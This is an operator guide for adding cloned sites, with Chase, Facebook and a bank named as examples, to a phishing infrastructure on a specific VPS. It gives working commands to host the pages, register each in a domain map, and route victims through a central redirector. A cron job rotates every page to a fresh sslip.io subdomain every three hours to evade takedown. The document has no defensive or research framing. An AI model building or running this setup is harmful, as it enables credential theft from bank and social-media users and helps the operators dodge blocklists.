# How to Add a New Phishing App to the Rotation System

This guide explains how to add a new application (e.g., "bank", "company") to your automated domain rotation system.

**Prerequisites:**
- You must have the source code or built files for the new app.
- The app must be a static site (HTML/JS/CSS) that can be served by a file server.
- You must have root access to the VPS.

---

## Step 1: Prepare the App Files

Your app files must be placed in the specific directory where the server expects them. The system serves files directly from the root of the app folder (no `dist` or `build` subfolders).

1.  **Navigate to the apps directory:**
    ```bash
    cd /opt/postal/caddy-data/apps
    ```

2.  **Create a folder for your new app:**
    Replace `appname` with the actual name of your app (e.g., `chase`, `facebook`, `company`). **Use lowercase letters only.**
    ```bash
    mkdir appname
    ```

3.  **Move your app files into this folder:**
    - If your app files are currently in a `dist` or `build` folder, move the **contents** of that folder here.
    - If your app files are in a zip archive, extract them directly into this folder.
    - **Critical:** The `index.html` file must be directly inside `/opt/postal/caddy-data/apps/appname/`. It cannot be in a subfolder.

    **Example (if files are in a zip):**
    ```bash
    unzip /path/to/app.zip -d /opt/postal/caddy-data/apps/appname/
    ```

    **Example (if files are in a `dist` folder):**
    ```bash
    mv /path/to/source/dist/* /opt/postal/caddy-data/apps/appname/
    ```

4.  **Verify the structure:**
    Run this command:
    ```bash
    ls -la /opt/postal/caddy-data/apps/appname/
    ```
    You **must** see `index.html` and your app assets (js, css, images) listed directly here. If you see another folder inside, you have placed the files incorrectly. Move the contents up one level.

---

## Step 2: Register the App in the System

Now you must add the app to the rotation database. This will generate a unique domain for it and configure the server.

1.  **Run the registration command:**
    Replace `appname` with the exact name you used in Step 1.
    ```bash
    APP_NAME="appname"
    NEW_ID=$(openssl rand -hex 4)
    NEW_DOMAIN="app-${NEW_ID}.169.58.100.196.sslip.io"

    echo "Adding $APP_NAME to rotation system..."
    jq --arg app "$APP_NAME" --arg domain "$NEW_DOMAIN" '.[$app] = $domain' /opt/postal/apps-map.json > /tmp/apps-map.json && mv /tmp/apps-map.json /opt/postal/apps-map.json

    echo "Updating server configuration..."
    /opt/postal/rotate-domains.sh

    echo "Done! $APP_NAME is now active."
    ```

2.  **Verify the app is active:**
    - Check the mapping file:
      ```bash
      cat /opt/postal/apps-map.json
      ```
      You should see your `appname` listed with a domain like `app-xxxx.169.58.100.196.sslip.io`.

    - Test the central router (replace `appname` with your app name):
      ```bash
      curl -I https://central.169.58.100.196.sslip.io/appname
      ```
      You should receive a `302` redirect response to the new domain.

    - Test the new domain directly (replace the domain with the one from `apps-map.json`):
      ```bash
      curl -I https://app-xxxx.169.58.100.196.sslip.io
      ```
      You should receive a `200 OK` response.

---

## Step 3: Confirm Automatic Rotation

Your new app is now part of the automated system.

- The cron job (`/opt/postal/rotate-all-apps.sh`) runs every 3 hours.
- It will automatically generate a new domain for `appname` and update the system.
- The central link (`https://central.169.58.100.196.sslip.io/appname`) will always work and point to the latest valid domain.
- Old domains will stop working immediately after rotation.

**No further action is required.** The system is fully automated.

---

## Troubleshooting

**Issue: "App not found" error when testing.**
- **Cause:** The app name in `apps-map.json` does not match the folder name or the URL you are testing.
- **Fix:** Ensure the app name in `apps-map.json` exactly matches the folder name in `/opt/postal/caddy-data/apps/`.

**Issue: 404 Error when accessing the domain.**
- **Cause:** The `index.html` file is missing or in the wrong location.
- **Fix:** Verify the file structure in Step 1. `index.html` must be in the root of the app folder.

**Issue: Cron job is not rotating the app.**
- **Cause:** The cron job might be disabled or failing.
- **Fix:** Check the logs:
  ```bash
  cat /var/log/domain-rotation.log
